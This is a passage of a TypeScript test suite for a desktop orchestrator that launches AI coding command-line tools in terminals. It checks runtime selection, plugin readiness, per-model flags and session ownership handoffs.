      fs.mkdirSync(path.dirname(node), { recursive: true });
      fs.writeFileSync(node, "", { mode: 0o755 });
      return node;
    });
    const home = path.join(root, "home");
    fs.mkdirSync(home);
    return { root, entry, bin, nodes, home };
  }

  async function spawnMcode(bin: string): Promise<PtySpawnSpec> {
    const host = fakeHost();
    setPtyHost(host.host);
    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24, model: "minimax/MiniMax-M3" },
      builtinCliPtyAdapter("minimax-code"),
      { binPath: bin },
      revisionBoundWorker(),
    );
    const spec = host.specFor(sessionId);
    await orchTerminateSession(sessionId);
    return spec;
  }

  it("decisão pronta do permit: Node que carrega o addon + entrypoint; sem decisão, o shebang de sempre", async () => {
    const { minimaxNodeRuntimeForSpawn, resetMinimaxNodeRuntimeForTests, prepareMinimaxNodeRuntime } =
      await import("../adapters/minimax-node-runtime");
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    setAgentSpawnHook(null);
    const fx = mcodeFixture();
    // PATH do spawn = PATH do processo, com o Node 22 (ABI errado) à frente.
    vi.stubEnv("PATH", fx.nodes.map((node) => path.dirname(node)).join(path.delimiter));
    vi.stubEnv("HOME", fx.home);
    resetMinimaxNodeRuntimeForTests();
    try {
      const shebang = await spawnMcode(fx.bin);
      expect(shebang.file).toBe(fx.bin);
      expect(shebang.args[0]).not.toBe(fx.entry);
      // O spawn sem decisão deixou a preparação correndo para o próximo spawn.
      await vi.waitFor(() => {
        expect(minimaxNodeRuntimeForSpawn(fx.bin, process.env.PATH ?? "")).toBeDefined();
      });

      // O permit da CLI decide antes do spawn (aqui com a sonda do ABI simulada).
      resetMinimaxNodeRuntimeForTests();
      await prepareMinimaxNodeRuntime(fx.bin, process.env.PATH ?? "",
        async (node) => (node === fx.nodes[1] ? "loads" : "fails"));
      const pinned = await spawnMcode(fx.bin);
      expect(pinned.file).toBe(fx.nodes[1]);
      expect(pinned.args[0]).toBe(fx.entry);
      expect(pinned.args.slice(1)).toEqual(expect.arrayContaining(["--model", "minimax/MiniMax-M3"]));
    } finally {
      vi.unstubAllEnvs();
      resetMinimaxNodeRuntimeForTests();
      fs.rmSync(fx.root, { recursive: true, force: true });
    }
  });
});

// Smoke opt-in (NEXUS_PROVIDER_BOOT_SMOKE=1, fora da suíte normal): a CLI
// instalada roda num PTY de verdade (scripts/provider-boot-pty.py) com o spawn
// spec que o Nexus monta, por 20 s e SEM prompt (nenhuma chamada de modelo).
// A credencial é a do perfil nativo, lida só pela própria CLI; spec e saída
// ficam em memória e só a cauda sanitizada é impressa.
it.skipIf(process.env.NEXUS_PROVIDER_BOOT_SMOKE !== "1").each([
  ["qwen", "worktree longa (F-788)"],
  ["minimax-code", "Node do PATH com outro ABI (F-789)"],
])("smoke de boot real: %s — %s", async (provider) => {
  const { prepareQwenMcpSession } = await import("../orch/cli-mcp-session-qwen");
  const { prepareMinimaxMcpSession } = await import("../orch/cli-mcp-session-minimax");
  const { prepareMinimaxNodeRuntime } = await import("../adapters/minimax-node-runtime");
  const { sanitizePaneBootOutput } = await import("../orch/pane-boot-output");
  const { execFile } = await import("node:child_process");
  const { createServer } = await import("node:http");
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "nexus-provider-boot-")));
  // MCP do Nexus de mentira: só responde ao handshake.
  const server = createServer((req, res) => {
    let body = "";
    req.on("data", (chunk) => { body += chunk; });
    req.on("end", () => {
      const call = JSON.parse(body) as { id?: unknown; method?: string };
      if (call.id === undefined) { res.writeHead(202).end(); return; }
      const result = call.method === "initialize"
        ? { protocolVersion: "2025-03-26", capabilities: { tools: {} }, serverInfo: { name: "nexus", version: "1.0.0" } }
        : call.method === "tools/list" ? { tools: [] } : {};
      res.setHeader("content-type", "application/json");
      res.end(JSON.stringify({ jsonrpc: "2.0", id: call.id, result }));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const url = `http://127.0.0.1:${(server.address() as { port: number }).port}/mcp`;
  const token = "fixture-provider-boot-smoke";
  const bin = path.join(os.homedir(), ".npm-global", "bin", provider === "qwen" ? "qwen" : "mcode");
  // Writer do Qwen numa worktree com o formato da do Nexus (nome de projeto > 255).
  const cwd = provider === "qwen"
    ? path.join(root, `project-${"a".repeat(64)}`, `checkout-${"b".repeat(64)}`, "worktrees", `task-${"c".repeat(64)}`)
    : fs.realpathSync(process.cwd());
  fs.mkdirSync(cwd, { recursive: true });
  const authority = preRevisionMissionWorker(cwd);
  const host = fakeHost();
  setPtyHost(host.host);
  setSquadCliPolicyLookupForTests(() => "operator-choice");
  const prepared = provider === "qwen"
    ? prepareQwenMcpSession(url, token, {
        home: path.join(root, "home"), providerHome: path.join(os.homedir(), ".qwen"),
        artifactRoot: path.join(root, "artifacts"), userDataPath: app.getPath("userData"),
        checkoutId: authority.scope.checkoutId, cwd, workspaceRoot: cwd,
        governed: true, allowedSkills: [], allowedTools: [],
      })
    : { ...prepareMinimaxMcpSession(url, token, { home: path.join(root, "home"), nodePath: process.execPath }), extraArgs: [] };
  // Qwen: settings de sistema (precedência máxima) só desligam o auto-update
  // durante o smoke; a instalação global do operador não muda.
  const systemSettings = path.join(root, "qwen-system-settings.json");
  fs.writeFileSync(systemSettings, JSON.stringify({ general: { enableAutoUpdate: false } }));
  const env = provider === "qwen"
    ? { ...prepared.env, QWEN_CODE_SYSTEM_SETTINGS_PATH: systemSettings }
    : prepared.env;
  setAgentSpawnHook(() => ({ authorityToken: token, env, extraArgs: prepared.extraArgs }));
  // O permit da CLI decide o Node do mcode antes do spawn (F-789).
  const runtime = provider === "minimax-code"
    ? await prepareMinimaxNodeRuntime(bin, process.env.PATH ?? "")
    : null;
  let id: string | undefined;
  try {
    const spawned = spawnAgentSession(fakeWc(), {
      kind: "cli-agent", cols: 100, rows: 30,
      model: provider === "qwen" ? "qwen3.8-max" : "minimax/MiniMax-M3",
    }, builtinCliPtyAdapter(provider), { binPath: bin }, authority);
    id = spawned.sessionId;
    const spec = host.specFor(id);
    const result = await new Promise<string>((resolve, reject) => {
      const child = execFile("python3", ["scripts/provider-boot-pty.py"],
        { timeout: 40_000, maxBuffer: 4 * 1024 * 1024 },
        (error, stdout) => (error ? reject(error) : resolve(stdout)));
      child.stdin!.end(JSON.stringify({ ...spec, seconds: 20 }));
    });
    const captured = JSON.parse(result) as { exitCode: number | null; output: string };
    console.log(JSON.stringify({
      provider,
      file: spec.file,
      argsHead: spec.args.slice(0, 3),
      runtime,
      logicalCwd: spec.env.NEXUS_QWEN_LOGICAL_CWD ?? null,
      exitCode: captured.exitCode,
      tail: sanitizePaneBootOutput(captured.output),
    }, null, 2));
    // Vivo depois de 20 s = passou do boot (Qwen morria em 2 s, MiniMax em ~10 s).
    expect(captured.exitCode).toBe(null);
  } finally {
    if (id) await orchTerminateSession(id);
    setAgentSpawnHook(null);
    cleanupCliMcpSession(token);
    server.close();
    fs.rmSync(root, { recursive: true, force: true });
  }
}, 60_000);

describe("F-906 AGY native heavy admission readiness", () => {
  const darwinIt = process.platform === "darwin" ? it : it.skip;
  async function spawnAgy(gate: boolean, overrides: Parameters<typeof spawnAgentSession>[3] = {}) {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const spawns: Array<{ spec: PtySpawnSpec; readiness?: PtySpawnReadiness }> = [];
    setPtyHost({
      spawn(spec, handlers, readiness) {
        spawns.push({ spec, readiness });
        return { write: vi.fn(), resize: vi.fn(), kill: vi.fn(), terminate: vi.fn(async () => {
          handlers.onExit(0, 15); return { ok: true, rootExited: true, descendantsExited: true };
        }) };
      },
    });
    const tokens: string[] = [];
    setAgentSpawnHook((_adapter, _request, authority) => {
      const ctx = mintToken({ label: "agy-heavy", role: "user", scope: authority.scope, executionScope: authority.scope, allowedTools: null, allowedSkills: null });
      tokens.push(ctx.token);
      const env: Record<string, string> = gate ? { NEXUS_GATE_TOKEN: ctx.token } : {};
      return { authorityToken: ctx.token, env, extraArgs: [] };
    });
    const session = spawnAgentSession(fakeWc(), { kind: "cli-agent", cols: 80, rows: 24 }, builtinCliPtyAdapter("agy"), overrides, trustedSpawn());
    return { spawns, session, tokens };
  }
  async function finish(run: Awaited<ReturnType<typeof spawnAgy>>) {
    await orchTerminateSession(run.session.sessionId);
    setAgentSpawnHook(null);
    for (const token of run.tokens) cleanupCliMcpSession(token);
    resetGateForTests();
    agyHeavy.ensure.mockClear(); agyHeavy.channels.mockClear();
  }

  darwinIt("registers the AGY plugin, then opens the file channel, before the physical spawn", async () => {
    const run = await spawnAgy(true);
    try {
      const [{ spec, readiness }] = run.spawns;
      expect(readiness).toBeDefined();
      await expect(readiness!.wait).resolves.toEqual({ args: spec.args, env: {
        NEXUS_HEAVY_CHANNEL_DIR: "/private/agy-channel", NEXUS_HEAVY_CHANNEL_KEY: "a".repeat(64),
        NEXUS_HEAVY_CHANNEL_EPOCH: "agy-epoch", NEXUS_HEAVY_CHANNEL_PUBLIC_KEY: "agy-public" } });
      expect(agyHeavy.ensure).toHaveBeenCalledOnce();
      expect(agyHeavy.ensure.mock.calls[0][0]).toMatchObject({ home: spec.env.HOME, agyBin: "/mock/bin/agy" });
      // Installed where this pane's AGY reads plugins: its checkout HOME (F-567).
      expect(spec.env.HOME).not.toBe(os.homedir());
      expect(spec.env.HOME).toContain(path.join(app.getPath("userData"), "provider-state", "agy"));
      expect(agyHeavy.ensure.mock.calls[0][0].assertCurrent).toBeTypeOf("function");
      expect(agyHeavy.ensure.mock.calls[0][0].signal).toBeInstanceOf(AbortSignal);
      expect(agyHeavy.channels).toHaveBeenCalledOnce();
      expect(agyHeavy.channels.mock.calls[0][3]).toEqual({ transport: "file" });
      expect(agyHeavy.ensure.mock.invocationCallOrder[0]).toBeLessThan(agyHeavy.channels.mock.invocationCallOrder[0]);
      // Approval/network choices stay the selected Autopilot argv.
      expect(spec.args).toContain("--dangerously-skip-permissions");
    } finally { await finish(run); }
  });

  darwinIt("never births AGY when the plugin is not registered", async () => {
    agyHeavy.ensure.mockResolvedValueOnce({ registered: false, reason: "agy_heavy_plugin_foreign_collision" });
    const run = await spawnAgy(true);
    try {
      await expect(run.spawns[0].readiness!.wait).rejects.toThrow("agy_heavy_plugin_foreign_collision");
      expect(agyHeavy.channels).not.toHaveBeenCalled();
    } finally { await finish(run); }
  });

  darwinIt("degrades an operator-disabled plugin: the pane starts with the channel and a sanitized trace", async () => {
    agyHeavy.ensure.mockResolvedValueOnce({ registered: false, reason: "agy_heavy_plugin_disabled" });
    const run = await spawnAgy(true);
    try {
      await expect(run.spawns[0].readiness!.wait).resolves.toMatchObject({ env: { NEXUS_HEAVY_CHANNEL_EPOCH: "agy-epoch" } });
      expect(agyHeavy.channels.mock.calls[0][3]).toEqual({ transport: "file" });
      expect(lifecycleTrace.events.filter((event) => event.kind === "agy-heavy-plugin-degraded").at(-1)).toEqual({ kind: "agy-heavy-plugin-degraded", adapterId: "agy", name: "disabled" });
    } finally { await finish(run); }
  });

  darwinIt("pane cancellation releases a readiness stuck in plugin registration", async () => {
    agyHeavy.ensure.mockImplementationOnce((options) => new Promise((resolve) => {
      options.signal?.addEventListener("abort", () => resolve({ registered: false, reason: "agy_heavy_plugin_context_changed" }), { once: true });
    }));
    const run = await spawnAgy(true);
    try {
      const readiness = run.spawns[0].readiness!;
      await vi.waitFor(() => expect(agyHeavy.ensure).toHaveBeenCalledOnce());
      await expect(readiness.cleanup()).resolves.toBeUndefined();
      expect(agyHeavy.ensure.mock.calls[0][0].signal?.aborted).toBe(true);
      await expect(readiness.wait).rejects.toThrow();
      expect(agyHeavy.channels).not.toHaveBeenCalled();
    } finally { await finish(run); }
  });

  darwinIt("revalidates the session after the plugin await", async () => {
    agyHeavy.ensure.mockImplementationOnce(async () => { resetGateForTests(); return { registered: true }; });
    const run = await spawnAgy(true);
    try {
      await expect(run.spawns[0].readiness!.wait).rejects.toThrow("native_deferred_spawn_context_changed");
      expect(agyHeavy.channels).not.toHaveBeenCalled();
    } finally { await finish(run); }
  });

  darwinIt("F-1151: the deferred origin fence receives the allocated session id at every readiness boundary and at the host post", async () => {
    const fence = vi.fn();
    const run = await spawnAgy(true, { assertDeferredSpawnCurrent: fence });
    try {
      const readiness = run.spawns[0].readiness!;
      await readiness.wait;
      // The renderer may consume its single-use grant for THIS session before this point.
      expect(fence.mock.calls.length).toBeGreaterThan(1);
      readiness.assertCurrent();
      expect(fence.mock.calls.every(([sessionId]) => sessionId === run.session.sessionId)).toBe(true);
    } finally { await finish(run); }
  });

  darwinIt("F-1151: a refusing deferred fence stops the host post and never authorizes the birth", async () => {
    const onNativeBirthAuthorized = vi.fn();
    const fence = vi.fn();
    const run = await spawnAgy(true, { assertDeferredSpawnCurrent: fence, onNativeBirthAuthorized });
    try {
      const readiness = run.spawns[0].readiness!;
      await readiness.wait;
      fence.mockImplementation(() => { throw new Error("resume_authority_changed: claim released"); });
      expect(() => readiness.assertCurrent()).toThrow(/resume_authority_changed/);
      expect(onNativeBirthAuthorized).not.toHaveBeenCalled();
    } finally { await finish(run); }
  });

  it("F-1151: a refused late physical-proof callback never aborts the normal termination of the session", async () => {
    const run = await spawnAgy(false, { onPhysicalTerminationProof: () => { throw new Error("resume_cleanup_changed: foreign proof"); } });
    const logged = vi.spyOn(console, "error").mockImplementation(() => {});
    try {
      await expect(orchTerminateSession(run.session.sessionId)).resolves.toBe(true);
      expect(getSessionState(run.session.sessionId)).toBeNull();
      expect(logged.mock.calls.some(([line]) => String(line).includes("continuation physical proof not recorded"))).toBe(true);
    } finally { logged.mockRestore(); await finish(run); }
  });

  darwinIt("leaves AGY without a Nexus gate token unchanged", async () => {
    const run = await spawnAgy(false);
    try {
      expect(run.spawns[0].readiness).toBeUndefined();
      expect(agyHeavy.ensure).not.toHaveBeenCalled();
    } finally { await finish(run); }
  });
});

describe("F-992: perfil por modelo do Claude no argv físico", () => {
  async function spawnClaude(
    model: string,
    extraArgs: string[],
    version?: string,
  ): Promise<{ args: string[]; warnings: string[] | undefined }> {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-claude-effort-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const host = fakeHost();
    setPtyHost(host.host);
    if (version) cliVersions.set("/mock/bin/claude", version);
    let sessionId: string | null = null;
    try {
      const spawned = spawnMainOwnedAgentSession(
        { kind: "cli-agent", paneId: `claude-effort-${model}`, model, cols: 100, rows: 30 },
        builtinCliPtyAdapter("claude"),
        { extraArgs },
        revisionBoundWorker(fs.realpathSync.native(worktree)),
      );
      sessionId = spawned.sessionId;
      return { args: host.specFor(sessionId).args, warnings: spawned.warnings };
    } finally {
      cliVersions.clear();
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  }

  const effortOf = (args: readonly string[]): string | null => {
    const index = args.indexOf("--effort");
    return index < 0 ? null : args[index + 1]!;
  };

  it.each([
    ["claude-haiku-4-5", "low", null],
    ["claude-opus-4-7", "xhigh", "max"],
    ["claude-sonnet-4-6", "max", "high"],
    ["claude-sonnet-4-6", "xhigh", "high"],
    ["claude-opus-5-5", "max", "max"],
    ["claude-sonnet-5-5", "xhigh", "xhigh"],
    ["claude-haiku-5-5", "xhigh", "xhigh"],
  ])("%s com --effort %s chega à CLI como %s", async (model, requested, expected) => {
    const { args } = await spawnClaude(model, ["--effort", requested]);
    expect(args.slice(args.indexOf("--model"), args.indexOf("--model") + 2)).toEqual(["--model", model]);
    expect(effortOf(args)).toBe(expected);
  });

  it("CLI abaixo do minVersion avisa e mantém o default no argv", async () => {
    const { args, warnings } = await spawnClaude("claude-sonnet-5-5", [], "2.1.283");
    expect(args).toContain("claude-sonnet-5-5");
    expect(warnings).toEqual([expect.stringContaining("v2.1.284")]);
  });

  it("CLI na versão mínima ou acima não avisa", async () => {
    const { warnings } = await spawnClaude("claude-sonnet-5-5", [], "2.1.293");
    expect(warnings).toBeUndefined();
  });
});


describe('F-1143 — actual physical manual adoption and return', () => {
  it.each([false, true])('keeps exact identity and public authority through a second published manual adoption and heartbeat (readOnly=%s)', async readOnly => {
    const h = fakeHost(); setPtyHost(h.host);
    setSquadCliPolicyLookupForTests(() => 'operator-choice');
    const owner = Object.assign(fakeWc(), { id: readOnly ? 11432 : 11431 });
    const base = trustedSpawn(), oldMission = 'f1143-manual-old', newMission = 'f1143-manual-new';
    const paneId = `f1143-rendered-manual-${readOnly}`;
    const ctx = mintToken({ label: 'f1143 manual continuity', role: 'worker', missionId: oldMission, scope: base.scope,
      executionScope: base.scope, readOnly, allowedTools: ['pane_read'], allowedSkills: ['review'] });
    const authority: BoundSpawnAuthority = { ...base, source: 'pending', coordinationScope: base.scope, context: {
      scope: base.scope, executionScope: base.scope, role: 'worker', missionId: oldMission, operatorOpened: true,
      readOnly, nativeReadOnly: readOnly, allowedTools: ['pane_read'], allowedSkills: ['review'] } };
    const adapter = { ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }), id: 'grok',
      control: { ...builtinCliPtyAdapter('grok').control, effort: { arg: '--effort', levels: ['medium'], default: 'medium' } } };
    const panes = await import('../orch/pane-registry');
    const main = await import('../orch/main-owned-pane-runtime');
    const runtime = await import('../orch/mission-runtime-termination');
    const workspace = await import('../persistence/renderer-workspace-scope');
    setAgentSpawnHook(() => ({ authorityToken: ctx.token, env: {}, extraArgs: [] }));
    let sessionId: string | undefined;
    try {
      sessionId = spawnAgentSession(owner, { kind: 'cli-agent', paneId, cols: 80, rows: 24,
        accountId: 'manual-account', model: 'default', effort: 'medium' }, adapter, {}, authority).sessionId;
      bindTokenToSession(ctx.token, sessionId);
      const entry = { paneId, sessionId, kind: 'cli-agent' as const, adapterId: 'grok', model: 'default', title: 'Manual' };
      workspace.bindResolvedRendererWorkspaceScope(owner, base.scope);
      panes.syncPanes([entry], owner);
      panes.attachOrchMeta(owner, paneId, { missionId: oldMission, role: 'worker', operatorOpened: true,
        scope: base.scope, executionScope: base.scope, readOnly });
      main.setMainOwnedPane(paneId, { entry, meta: { missionId: oldMission, role: 'worker', operatorOpened: true,
        scope: base.scope, executionScope: base.scope, readOnly } });
      expect(saveProviderPaneSession(base.scope, paneId, 'grok', { key: 'session_id', id: 'manual-native-conversation' }, 'manual-account')).toBe(true);
      expect(returnOperatorOpenedSessionToUser(sessionId, oldMission)).toBe(true);
      expect(releaseOperatorOpenedAgentSession(sessionId, oldMission)).toBe(true);
      panes.detachOperatorOpenedPaneMission(paneId, oldMission);
      const before = getAgentSessionInfo(sessionId)!;
      const stable = { sessionId, paneId, accountId: before.accountId, model: before.model, effort: before.effort,
        scope: before.scope, readOnly: before.readOnly, nativeReadOnly: before.nativeReadOnly,
        allowedTools: before.allowedTools, allowedSkills: before.allowedSkills };
      expect(before.operatorOpened).toBeUndefined(); expect(before.missionId).toBeUndefined();
      // The original Main-owned manual mark survives the first normal return;
      // the second role/mission publication must come from the real producer.
      const origin = panes.captureOperatorPaneAdoptionOrigin(sessionId)!;
      expect(origin.authority.operatorOpened).toBe(true);
      expect(adoptUserContextAsMissionOrchestrator(ctx, newMission)).toBe(true);
      expect(adoptUserAgentSessionAsMissionOrchestrator(sessionId, newMission)).toBe(true);
      expect(panes.publishAdoptedOperatorMissionPane(origin, ctx, newMission)).toBe(true);
      const adopted = getAgentSessionInfo(sessionId)!;
      expect(returnAdoptedAgentSessionToUser(sessionId, oldMission)).toBe(false);
      expect(getAgentSessionInfo(sessionId)).toEqual(adopted);
      panes.syncPanes([entry], owner);
      expect(panes.listPaneSnapshots().find(pane => pane.paneId === paneId)).toMatchObject({ sessionId, paneId,
        role: 'orchestrator', missionId: newMission, scope: base.scope, executionScope: base.scope });
      expect(panes.getPaneRuntimeAuthorityBySession(sessionId)).toMatchObject({ sessionId, paneId,
        role: 'orchestrator', missionId: newMission, scope: base.scope, executionScope: base.scope, owner });
      const spec = { id: 'manual-rendered-spec', missionId: newMission, paneId, adapterId: 'grok', title: 'Manual',
        role: 'orchestrator', operatorOpened: true, scope: base.scope, executionScope: base.scope };
      const suite = { missions: { get: () => ({ id: newMission, status: 'done' }) }, missionPanes: { list: () => [spec] } };
      await expect(runtime.terminateMissionRuntime({ scope: base.scope, missionId: newMission, suite: suite as never,
        reason: 'operator-close' })).resolves.toMatchObject({ ok: true });
      const returned = getAgentSessionInfo(sessionId)!;
      expect(returned).toMatchObject({ role: 'user', ...stable });
      expect(returned.coordinationScope ?? returned.scope).toEqual(before.coordinationScope ?? before.scope);
      expect(returned.missionId).toBeUndefined(); expect(ctx).toMatchObject({ role: 'user', readOnly });
      expect(ctx.missionId).toBeUndefined(); expect(returnAdoptedAgentSessionToUser(sessionId, newMission)).toBe(false);
      expect(getProviderPaneSession(base.scope, paneId, 'grok', 'manual-account')?.id).toBe('manual-native-conversation');
      expect(panes.getPaneRuntimeAuthorityBySession(sessionId)?.missionId).toBeUndefined();
      expect(h.procFor(sessionId).kill).not.toHaveBeenCalled(); expect(h.procFor(sessionId).terminate).not.toHaveBeenCalled();
    } finally {
      panes.syncPanes([], owner); panes.unregisterOrchRenderer(owner); workspace.clearRendererWorkspaceScope(owner);
      main.deleteMainOwnedPane(paneId);
      if (sessionId) await orchTerminateSession(sessionId, { origin: 'f1143-rendered-manual-fixture:teardown' });
      setAgentSpawnHook(null); if (sessionId) releaseSession(sessionId);
    }
  });

  it.each(['volatile', 'durable'] as const)('returns the released/adopted physical hand from %s manual ownership without killing it', async ownership => {
    const h = fakeHost(); setPtyHost(h.host);
    const base = trustedSpawn();
    const authority: BoundSpawnAuthority = { ...base, source: 'pending', coordinationScope: base.scope,
      context: { missionId: 'f1143-old', role: 'worker', operatorOpened: true, scope: base.scope,
        executionScope: base.scope, allowedTools: [], allowedSkills: [] } };
    const paneId = `f1143-manual-${ownership}`;
    const sessionId = spawnMainOwnedAgentSession({ kind: 'cli-agent', paneId, cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }), {}, authority).sessionId;
    const panes = await import('../orch/pane-registry');
    const main = await import('../orch/main-owned-pane-runtime');
    const runtime = await import('../orch/mission-runtime-termination');
    const ctx = mintToken({ label: 'f1143 physical manual', role: 'worker', missionId: 'f1143-old', scope: base.scope, allowedTools: [], allowedSkills: [] });
    bindTokenToSession(ctx.token, sessionId);
    main.setMainOwnedPane(paneId, { entry: { paneId, sessionId, kind: 'cli-agent', title: 'Manual', adapterId: 'test-cli' },
      meta: { missionId: 'f1143-old', role: 'worker', operatorOpened: true, scope: base.scope, executionScope: base.scope } });
    try {
      expect(returnOperatorOpenedSessionToUser(sessionId, 'f1143-old')).toBe(true);
      expect(releaseOperatorOpenedAgentSession(sessionId, 'f1143-old')).toBe(true);
      panes.detachOperatorOpenedPaneMission(paneId, 'f1143-old');
      const before = getAgentSessionInfo(sessionId)!;
      expect(before).toMatchObject({ role: 'user', sessionId });
      expect(before.operatorOpened).toBeUndefined();
      const origin = panes.captureOperatorPaneAdoptionOrigin(sessionId)!;
      expect(origin.authority.operatorOpened).toBe(true);
      expect(adoptUserContextAsMissionOrchestrator(ctx, 'f1143-new')).toBe(true);
      expect(adoptUserAgentSessionAsMissionOrchestrator(sessionId, 'f1143-new')).toBe(true);
      expect(panes.publishAdoptedOperatorMissionPane(origin, ctx, 'f1143-new')).toBe(true);
      const spec = { id: 'manual-spec', missionId: 'f1143-new', paneId, adapterId: 'test-cli', title: 'Manual', role: 'orchestrator',
        operatorOpened: true, scope: base.scope, executionScope: base.scope };
      if (ownership === 'durable') {
        const current = main.getMainOwnedPane(paneId)!;
        main.setMainOwnedPane(paneId, { ...current, meta: { ...current.meta, operatorOpened: undefined } });
      }
      const suite = { missions: { get: () => ({ id: 'f1143-new', status: 'done' }) },
        missionPanes: { list: () => ownership === 'durable' ? [spec] : [] } };
      await expect(runtime.terminateMissionRuntime({ scope: base.scope, missionId: 'f1143-new', suite: suite as never,
        reason: 'operator-close' })).resolves.toMatchObject({ ok: true });
      const returned = getAgentSessionInfo(sessionId)!;
      expect(returned).toMatchObject({ sessionId, paneId, role: 'user', allowedTools: before.allowedTools,
        allowedSkills: before.allowedSkills, readOnly: before.readOnly, nativeReadOnly: before.nativeReadOnly });
      expect(returned.missionId).toBeUndefined();
      expect(ctx.role).toBe('user'); expect(ctx.missionId).toBeUndefined();
      expect(main.getMainOwnedPane(paneId)?.meta.missionId).toBeUndefined();
      expect(getSessionState(sessionId)).not.toBeNull();
      expect(h.procFor(sessionId).terminate).not.toHaveBeenCalled();
      expect(h.procFor(sessionId).kill).not.toHaveBeenCalled();
      await expect(runtime.closeOrphanedMissionRuntime({ scope: base.scope, missionId: 'f1143-new' })).resolves.toMatchObject({ ok: true, terminatedSessionIds: [] });
      expect(getAgentSessionInfo(sessionId)?.role).toBe('user');
      expect(getAgentSessionInfo(sessionId)?.missionId).toBeUndefined();
    } finally {
      main.deleteMainOwnedPane(paneId);
      await orchTerminateSession(sessionId, { origin: 'f1143-physical-fixture:teardown' });
      releaseSession(sessionId);
    }
  });
});

describe("F-232 / F-1291 registro de spawn durável em spawnAgentSession", () => {
  it("registra spawn de agente e ignora resume:true", () => {
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "pty-spawn-durable-")));
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      { resumeArgs: [], resumeIdArgs: ["--resume"], sessionIdArg: "--session-id" },
    );
    const authority = trustedSpawn(root);
    setPtyHost(fakeHost().host);
    const beforeCount = listDurableRouteUses().filter((u) => u.adapterId === "test-cli").length;

    // 1. Spawn frio registra
    const first = spawnAgentSession(fakeWc(), { kind: "cli-agent", paneId: "pane-spawn-dur-1", cols: 80, rows: 24 }, adapter, {}, authority);
    const afterFirst = listDurableRouteUses().filter((u) => u.adapterId === "test-cli");
    expect(afterFirst.length).toBe(beforeCount + 1);
    expect(afterFirst.at(-1)?.sessionId).toBe(first.sessionId);

    // 2. Resume não registra de novo
    const resumed = spawnAgentSession(fakeWc(), { kind: "cli-agent", paneId: "pane-spawn-dur-1", resume: true, cols: 80, rows: 24 }, adapter, {}, authority);
    const afterResumed = listDurableRouteUses().filter((u) => u.adapterId === "test-cli");
    expect(afterResumed.length).toBe(beforeCount + 1);

    orchKillSession(first.sessionId);
    orchKillSession(resumed.sessionId);
    fs.rmSync(root, { recursive: true, force: true });
  });
});

